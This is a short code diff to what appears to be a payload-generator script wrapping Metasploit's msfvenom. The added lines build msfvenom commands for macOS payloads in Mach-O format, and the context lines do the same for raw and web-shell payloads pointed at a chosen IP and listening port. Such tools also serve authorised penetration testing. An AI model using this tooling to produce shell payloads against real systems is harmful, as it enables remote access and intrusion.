@@ -129,6 +129,11 @@ def generate_payload(params,number,avail_payloads):
         K_FORMAT = "raw"
         payload="msfvenom -p {} {}={} LPORT={} -f {} ".format(payload_cmd,HOST, IP,PORT,K_FORMAT)       
     
+    if "osx/" in payload_cmd:
+        print("[EXPERIMENTAL] Try to process OSX payload..")
+        K_FORMAT = "macho"
+        payload="msfvenom -p {} {}={} LPORT={} -f {} -o {}".format(payload_cmd,HOST, IP,PORT,K_FORMAT, pname + "." + K_FORMAT)
+    
     if args.SHELL_TYPE == "web":
         K_FORMAT = K_EXT if K_EXT != "jsp" else "raw"
         payload="msfvenom -p {} {}={} LPORT={} -f {} -o {}".format(payload_cmd,HOST, IP,PORT,K_FORMAT, pname + "." + K_EXT)
